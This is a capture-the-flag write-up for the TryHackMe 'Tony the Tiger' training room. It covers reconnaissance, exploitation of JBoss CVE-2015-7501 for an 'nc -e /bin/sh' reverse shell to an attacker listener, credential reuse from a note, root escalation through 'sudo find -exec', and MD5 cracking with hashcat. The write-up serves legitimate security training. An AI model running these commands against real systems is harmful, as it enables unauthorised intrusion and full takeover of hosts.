| Category          | Details                                                                    |
|-------------------|----------------------------------------------------------------------------|
| 📝 **Name**       | [Tony the Tiger](https://tryhackme.com/room/tonythetiger)                  |  
| 🏷 **Type**       | THM Challenge                                                              |
| 🖥 **OS**         | Linux                                                                      |
| 🎯 **Difficulty** | Easy                                                                       |
| 📁 **Tags**       | [CVE-2015-7501](https://nvd.nist.gov/vuln/detail/CVE-2015-7501), sudo find |

## Task 2: Support Material

### What is a great IRL example of an "Object"?
> A lamp is a great "Object".

Answer: `lamp`

### What is the acronym of a possible type of attack resulting from a "serialisation" attack?
> A "serialisation" attack is the injection and/or modification of data throughout the "byte stream" stage. When this data is later accessed by the application, malicious code can result in serious implications...ranging from DoS, [...]

Answer: `DoS`

### What lower-level format does data within "Objects" get converted into?
> A "serialisation" attack is the injection and/or modification of data throughout the "byte stream" stage.

Answer: `byte stream`

## Task 3: Reconnaissance

### What service is running on port "8080"

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Tony the Tiger]
└─$ nmap -sS -sC -sV -p- $TARGET              
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-25 10:41 +0100
Nmap scan report for 10.81.142.23
Host is up (0.046s latency).
Not shown: 65518 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:97:8c:b9:74:d0:f3:9e:fe:f3:a5:ea:f8:a9:b5:7a (DSA)
|   2048 33:a4:7b:91:38:58:50:30:89:2d:e4:57:bb:07:bb:2f (RSA)
|   256 21:01:8b:37:f5:1e:2b:c5:57:f1:b0:42:b7:32:ab:ea (ECDSA)
|_  256 f6:36:07:3c:3b:3d:71:30:c4:cd:2a:13:00:b5:25:ae (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-generator: Hugo 0.66.0
|_http-title: Tony&#39;s Blog
1090/tcp open  java-rmi    Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1091/tcp open  java-rmi    Java RMI
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     #http://thm-java-deserial.home:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpwA
|     UnicastRef2
|_    thm-java-deserial.home
3873/tcp open  java-object Java Object Serialization
4446/tcp open  java-object Java Object Serialization
4712/tcp open  msdtc       Microsoft Distributed Transaction Coordinator (error)
4713/tcp open  pulseaudio?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    126a
5445/tcp open  smbdirect?
5455/tcp open  apc-5455?
5500/tcp open  hotline?
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     CRAM-MD5
|     NTLM
|     GSSAPI
|     DIGEST-MD5
|     thm-java-deserial
|   DNSVersionBindReqTCP: 
|     CRAM-MD5
|     DIGEST-MD5
|     NTLM
|     GSSAPI
|     thm-java-deserial
|   GenericLines, NULL: 
|     GSSAPI
|     DIGEST-MD5
|     CRAM-MD5
|     NTLM
|     thm-java-deserial
|   GetRequest: 
|     NTLM
|     CRAM-MD5
|     DIGEST-MD5
|     GSSAPI
|     thm-java-deserial
|   HTTPOptions: 
|     DIGEST-MD5
|     GSSAPI
|     NTLM
|     CRAM-MD5
|     thm-java-deserial
|   Help: 
|     GSSAPI
|     DIGEST-MD5
|     NTLM
|     CRAM-MD5
|     thm-java-deserial
|   Kerberos, TLSSessionReq: 
|     NTLM
|     GSSAPI
|     CRAM-MD5
|     DIGEST-MD5
|     thm-java-deserial
|   RPCCheck: 
|     GSSAPI
|     CRAM-MD5
|     DIGEST-MD5
|     NTLM
|     thm-java-deserial
|   RTSPRequest: 
|     CRAM-MD5
|     DIGEST-MD5
|     GSSAPI
|     NTLM
|     thm-java-deserial
|   SSLSessionReq: 
|     CRAM-MD5
|     GSSAPI
|     NTLM
|     DIGEST-MD5
|     thm-java-deserial
|   TerminalServerCookie: 
|     DIGEST-MD5
|     CRAM-MD5
|     GSSAPI
|     NTLM
|_    thm-java-deserial
5501/tcp open  tcpwrapped
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Welcome to JBoss AS
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
8083/tcp open  http        JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.98%I=7%D=1/25%Time=6975E54F%P=x86_64-pc-linux-gnu%r(NU
SF:LL,17B,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x97
SF:\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objByt
SF:esq\0~\0\x01xp\xfb\xea\x9c\x86ur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\
SF:x02\0\0xp\0\0\x004\xac\xed\0\x05t\0#http://thm-java-deserial\.home:8083
SF:/q\0~\0\0q\0~\0\0uq\0~\0\x03\0\0\0\xcd\xac\xed\0\x05sr\0\x20org\.jnp\.s
SF:erver\.NamingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.se
SF:rver\.RemoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\
SF:.server\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpwA\0\x0bUnicastRe
SF:f2\0\0\x16thm-java-deserial\.home\0\0\x04J\xa3\xdf\xa0\(\xc1\xa1\xc9\x0
SF:7a\$\xa2'\0\0\x01\x9b\xf4\x83\xb7\x0c\x80\x02\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3873-TCP:V=7.98%I=7%D=1/25%Time=6975E555%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.98%I=7%D=1/25%Time=6975E555%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4713-TCP:V=7.98%I=7%D=1/25%Time=6975E555%P=x86_64-pc-linux-gnu%r(NU
SF:LL,5,"126a\n")%r(GenericLines,5,"126a\n")%r(GetRequest,5,"126a\n")%r(HT
SF:TPOptions,5,"126a\n")%r(RTSPRequest,5,"126a\n")%r(RPCCheck,5,"126a\n")%
SF:r(DNSVersionBindReqTCP,5,"126a\n")%r(DNSStatusRequestTCP,5,"126a\n")%r(
SF:Help,5,"126a\n")%r(SSLSessionReq,5,"126a\n")%r(TerminalServerCookie,5,"
SF:126a\n")%r(TLSSessionReq,5,"126a\n")%r(Kerberos,5,"126a\n")%r(SMBProgNe
SF:g,5,"126a\n")%r(X11Probe,5,"126a\n")%r(FourOhFourRequest,5,"126a\n")%r(
SF:LPDString,5,"126a\n")%r(LDAPSearchReq,5,"126a\n")%r(LDAPBindReq,5,"126a
SF:\n")%r(SIPOptions,5,"126a\n")%r(LANDesk-RC,5,"126a\n")%r(TerminalServer
SF:,5,"126a\n")%r(NCP,5,"126a\n")%r(NotesRPC,5,"126a\n")%r(JavaRMI,5,"126a
SF:\n")%r(WMSRequest,5,"126a\n")%r(oracle-tns,5,"126a\n")%r(ms-sql-s,5,"12
SF:6a\n")%r(afp,5,"126a\n")%r(giop,5,"126a\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5500-TCP:V=7.98%I=7%D=1/25%Time=6975E555%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GSS
SF:API\x01\nDIGEST-MD5\x01\x08CRAM-MD5\x01\x04NTLM\x02\x11thm-java-deseria
SF:l")%r(GenericLines,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\
SF:0\x02\x01\x06GSSAPI\x01\nDIGEST-MD5\x01\x08CRAM-MD5\x01\x04NTLM\x02\x11
SF:thm-java-deserial")%r(GetRequest,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x0
SF:3\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x06
SF:GSSAPI\x02\x11thm-java-deserial")%r(HTTPOptions,4B,"\0\0\0G\0\0\x01\0\x
SF:03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x06GSSAPI\x01\x0
SF:4NTLM\x01\x08CRAM-MD5\x02\x11thm-java-deserial")%r(RTSPRequest,4B,"\0\0
SF:\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\n
SF:DIGEST-MD5\x01\x06GSSAPI\x01\x04NTLM\x02\x11thm-java-deserial")%r(RPCCh
SF:eck,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GS
SF:SAPI\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x04NTLM\x02\x11thm-java-deseri
SF:al")%r(DNSVersionBindReqTCP,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03
SF:\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x04NTLM\x01\x06GSSAP
SF:I\x02\x11thm-java-deserial")%r(DNSStatusRequestTCP,4B,"\0\0\0G\0\0\x01\
SF:0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\x04NTLM\x01\x
SF:06GSSAPI\x01\nDIGEST-MD5\x02\x11thm-java-deserial")%r(Help,4B,"\0\0\0G\
SF:0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GSSAPI\x01\nDIGEST
SF:-MD5\x01\x04NTLM\x01\x08CRAM-MD5\x02\x11thm-java-deserial")%r(SSLSessio
SF:nReq,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08C
SF:RAM-MD5\x01\x06GSSAPI\x01\x04NTLM\x01\nDIGEST-MD5\x02\x11thm-java-deser
SF:ial")%r(TerminalServerCookie,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x0
SF:3\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x08CRAM-MD5\x01\x06GSSAPI\x01\x04NT
SF:LM\x02\x11thm-java-deserial")%r(TLSSessionReq,4B,"\0\0\0G\0\0\x01\0\x03
SF:\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x06GSSAPI\x01\x08CRAM-
SF:MD5\x01\nDIGEST-MD5\x02\x11thm-java-deserial")%r(Kerberos,4B,"\0\0\0G\0
SF:\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x06GSSAPI\
SF:x01\x08CRAM-MD5\x01\nDIGEST-MD5\x02\x11thm-java-deserial");
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 218.61 seconds
```

Answer: `Apache Tomcat/Coyote JSP engine 1.1`

### What is the name of the front-end application running on "8080"?

Answer: `JBoss`

## Task 4: Find Tony's Flag!

### This flag will have the formatting of "THM{}"

#### Discover flag in `be2sOV9.jpg` image
```
┌──(magicrc㉿perun)-[~/attack/THM Tony the Tiger]
└─$ wget --user-agent=agent -q https://i.imgur.com/be2sOV9.jpg && strings be2sOV9.jpg | grep -oP THM{.+} | head -n 1
THM{Tony_Sure_Loves_Frosted_Flakes}
```

## Task 6: Find User JBoss' flag!

### This flag has the formatting of "THM{}"

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM Tony the Tiger]
└─$ nc -lvnp 4444
listening on [any] 4444 ..
```

#### Spawn reverse shell connection by exploiting [CVE-2015-7501](https://nvd.nist.gov/vuln/detail/CVE-2015-7501)
```
┌──(magicrc㉿perun)-[~/attack/THM Tony the Tiger]
└─$ wget -q https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/CVE%20Exploits/JBoss%20CVE-2015-7501.py -O CVE-2015-7501.py && \
sed -i 's/CommonsCollections1/CommonsCollections5/g' CVE-2015-7501.py && \
python3 ./CVE-2015-7501.py --ysoserial-path ~/Tools/ysoserial/ysoserial.jar $TARGET:8080 "nc 192.168.130.56 4444 -e /bin/sh"
[*] Target IP: 10.81.142.23
[*] Target PORT: 8080
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Command executed successfully
```

#### Confirm foothold gained
```
┌──(magicrc㉿perun)-[~/attack/THM Tony the Tiger]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.130.56] from (UNKNOWN) [10.81.142.23] 37482
/usr/bin/script -qc /bin/bash /dev/null
cmnatic@thm-java-deserial:/$ id
uid=1000(cmnatic) gid=1000(cmnatic) groups=1000(cmnatic),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare)
```

#### Capture `jboss` user flag
```
cmnatic@thm-java-deserial:~$ cat /home/jboss/.jboss.txt
THM{50c10ad46b5793704601ecdad865eb06}
```

## Task 7: Escalation!

### The final flag does not have the formatting of "THM{}"

#### Discover `jboss` user password
```
cmnatic@thm-java-deserial:~$ cat /home/jboss/note
Hey JBoss!
<SNIP>
Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)

Password: likeaboss
<SNIP>
```

#### Access target over SSH using `jboss:likeaboss` credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Tony the Tiger]
└─$ ssh jboss@$TARGET
<SNIP>
jboss@thm-java-deserial:~$ id
uid=1001(jboss) gid=1001(jboss) groups=1001(jboss)
```

#### List allowed `sudo` commands
```
jboss@thm-java-deserial:~$ sudo -l
Matching Defaults entries for jboss on thm-java-deserial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find
```

#### Escalate to `root` user using `sudo find`
```
jboss@thm-java-deserial:~$ sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Capture root flag
```
# cat /root/root.txt
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
```

```
┌──(magicrc㉿perun)-[~/attack/THM Tony the Tiger]
└─$ MD5_HASH=$(echo -n QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y== | base64 -d 2> /dev/null); \
hashcat -m 0 $MD5_HASH /usr/share/wordlists/rockyou.txt --quiet
bc77ac072ee30e3760806864e234c7cf:zxcvbnm123456789
```
